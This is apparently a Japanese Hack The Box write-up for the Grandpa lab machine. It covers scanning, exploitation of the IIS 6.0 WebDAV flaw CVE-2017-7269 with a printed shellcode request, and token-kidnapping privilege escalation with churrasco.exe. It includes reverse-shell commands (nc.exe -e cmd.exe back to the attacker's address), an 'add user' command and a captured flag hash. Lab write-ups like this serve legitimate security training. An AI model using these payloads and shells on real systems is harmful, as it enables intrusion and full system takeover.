https://app.hackthebox.com/machines/Grandpa

## STEP 1
```sh
└─$ rustscan -a 10.129.95.233 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
HACK THE PLANET

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.233:80
10.129.95.233 -> [80]
```

## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Grandpa_01.png">  
ヘッダを確認すると、iis 6.0 っぽい
```sh
└─$ curl -I http://10.129.95.233                                      
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.129.95.233/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:300"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Thu, 17 Jul 2025 01:26:05 GMT
```
列挙してみるとアクセスできるファイルがあったが、有益そうなものはなかった
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.95.233/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.233/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 253ms]
_private                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 302ms]
_vti_cnf                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 265ms]
_vti_log                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 300ms]
_vti_pvt                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 300ms]
_vti_txt                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 301ms]
_vti_bin                [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 343ms]
_vti_bin/_vti_aut/author.dll [Status: 200, Size: 195, Words: 5, Lines: 13, Duration: 474ms]
_vti_bin/_vti_adm/admin.dll [Status: 200, Size: 195, Words: 5, Lines: 13, Duration: 474ms]
_vti_bin/shtml.dll      [Status: 200, Size: 96, Words: 11, Lines: 1, Duration: 476ms]
aspnet_client           [Status: 403, Size: 218, Words: 14, Lines: 2, Duration: 252ms]
images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 252ms]
:: Progress: [4746/4746] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```
使えるhttpメソドを確認すると、PROPFIND があった。  
こいつは webdav で使われていたもの
```sh
└─$ nmap -n -Pn -p80 --script http-methods 10.129.95.233
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 11:07 EDT
Nmap scan report for 10.129.95.233
Host is up (0.33s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH

Nmap done: 1 IP address (1 host up) scanned in 4.72 seconds
```
webdavでは、ファイルを移動したり・アップロードできる  
`davtest`でファイルアップロードできるかテスト、すべて失敗
```sh
└─$ davtest -url http://10.129.95.233
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.95.233
********************************************************
NOTE    Random string for this session: pJ3Ic1CJYFcLb
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     cfm     FAIL
PUT     jsp     FAIL
PUT     txt     FAIL
PUT     php     FAIL
PUT     pl      FAIL
PUT     aspx    FAIL
PUT     asp     FAIL
PUT     cgi     FAIL
PUT     jhtml   FAIL
PUT     shtml   FAIL
PUT     html    FAIL

********************************************************
/usr/bin/davtest Summary:
```
iis6.0 webdav には、cve-2017-7269 が存在しrceできる。  
[PoC](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell)をダウンロード、実行
```sh
└─$ wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
--2025-07-19 13:09:20--  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12313 (12K) [text/plain]
Saving to: ‘iis6 reverse shell’

iis6 reverse shell                                         100%[========================================================================================================================================>]  12.02K  --.-KB/s    in 0.003s  

2025-07-19 13:09:20 (4.02 MB/s) - ‘iis6 reverse shell’ saved [12313/12313]

└─$ python3.13 iis6\ reverse\ shell                                 
  File "/home/kali/iis6 reverse shell", line 6
    print 'usage:iis6webdav.py targetip targetport reverseip reverseport\n'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
                                                                                                                                                                                                                                            
└─$ python2.7 iis6\ reverse\ shell  
usage:iis6webdav.py targetip targetport reverseip reverseport
                                                                                                                                                                                                                                      
└─$ python2.7 iis6\ reverse\ shell 10.129.95.233 80 10.10.16.7 4444
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

```
リバースシェル取得！しかしユーザフラグすらとれず
```cmd
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.95.233] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd C:\"Documents and Settings"\Harry
cd C:\"Documents and Settings"\Harry
Access is denied.
```


## STEP 3
hotfixはなにもない状態
```cmd
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 16 Hours, 25 Minutes, 16 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2594 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 760 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,304 MB
Page File: In Use:         166 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
iisでrceしたので、もちろんサービスアカウントを侵害した  
なので、seimpersonate権限がある
```cmd
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```
seimpersonate権限となるとポテト系を想像するが、windows server 2003 だったので churrasco.exe を使えばよいと、  
searchsploitで確認できた
```sh
└─$ searchsploit -x 6705 | grep '.'
  Exploit: Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/6705
     Path: /usr/share/exploitdb/exploits/windows/local/6705.txt
    Codes: N/A
 Verified: True
File Type: ASCII text
(From http://nomoreroot.blogspot.com/2008/10/windows-2003-poc-exploit-for-token.html)
It has been a long time since Token Kidnapping presentation (http://www.argeniss.com/research/TokenKidnapping.pdf)
was published so I decided to release a PoC exploit for Win2k3 that alows to execute code under SYSTEM account.
Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows
services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes
so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide
shared hosting services then I would recomend to not allow users to run this kind of code from ASP.
-SQL Server is a nice target for the exploit if you are a DBA and want to own Windows:
exec xp_cmdshell 'churrasco "net user /add hacker"'
-Exploiting IIS 6 with ASP .NET :
...
System.Diagnostics.Process myP = new System.Diagnostics.Process();
myP.StartInfo.RedirectStandardOutput = true;
myP.StartInfo.FileName=Server.MapPath("churrasco.exe");
myP.StartInfo.UseShellExecute = false;
myP.StartInfo.Arguments= " \"net user /add hacker\" ";
myP.Start();
string output = myP.StandardOutput.ReadToEnd();
Response.Write(output);
...
You can find the PoC exploit here http://www.argeniss.com/research/Churrasco.zip
backup link: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip (2008-Churrasco.zip)
Enjoy.
Cesar.
# milw0rm.com [2008-10-08]
```
churrasco.exe をダウンロード  
churrasco.exe と nc.exe をsmbserverにアップロード
```sh
└─$ wget https://github.com/Re4son/Churrasco/raw/refs/heads/master/churrasco.exe             
--2025-07-19 13:53:15--  https://github.com/Re4son/Churrasco/raw/refs/heads/master/churrasco.exe
Resolving github.com (github.com)... 20.27.177.113
Connecting to github.com (github.com)|20.27.177.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/Re4son/Churrasco/refs/heads/master/churrasco.exe [following]
--2025-07-19 13:53:15--  https://raw.githubusercontent.com/Re4son/Churrasco/refs/heads/master/churrasco.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31232 (30K) [application/octet-stream]
Saving to: ‘churrasco.exe’

churrasco.exe                                              100%[========================================================================================================================================>]  30.50K  --.-KB/s    in 0.01s   

2025-07-19 13:53:16 (2.67 MB/s) - ‘churrasco.exe’ saved [31232/31232]

└─$ plocate nc.exe       
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

└─$ cp /usr/share/windows-resources/binaries/nc.exe .

└─$ impacket-smbserver share .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
現パスにwrite権限はないので、C:\wmpub に移動  
nc.exe をダウンロード
```cmd
c:\windows\system32\inetsrv>mkdir a
mkdir a
Access is denied.

c:\windows\system32\inetsrv>dir C:\
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\

04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  05:32 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:18 PM    <DIR>          Program Files
09/16/2021  12:52 PM    <DIR>          WINDOWS
04/12/2017  05:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,373,024,256 bytes free

c:\windows\system32\inetsrv>icacls C:\wmpub
icacls C:\wmpub
C:\wmpub BUILTIN\Administrators:(F)
         BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         CREATOR OWNER:(I)(OI)(CI)(IO)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         BUILTIN\Users:(I)(CI)(AD)
         BUILTIN\Users:(I)(CI)(WD)

Successfully processed 1 files; Failed processing 0 files

c:\windows\system32\inetsrv>cd C:\wmpub
cd C:\wmpub

C:\wmpub>copy \\10.10.16.7\share\nc.exe .
copy \\10.10.16.7\share\nc.exe .
        1 file(s) copied.
```
エクスプロイト！
```cmd
c:\windows\system32\inetsrv>//10.10.16.7/share/churrasco.exe
//10.10.16.7/share/churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
C:\WINDOWS\TEMP

C:\wmpub>//10.10.16.7/share/churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.7 5555"
//10.10.16.7/share/churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.7 5555"
Access is denied.
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 664 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 668 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
権限昇格成功！ルートフラグゲット
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.95.233] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>type C:\"Documents and Settings"\Administrator\Desktop\root.txt
type C:\"Documents and Settings"\Administrator\Desktop\root.txt
9359e905a2c35f861f6a57cecf28bb7b
```

https://jlajara.gitlab.io/process-migration
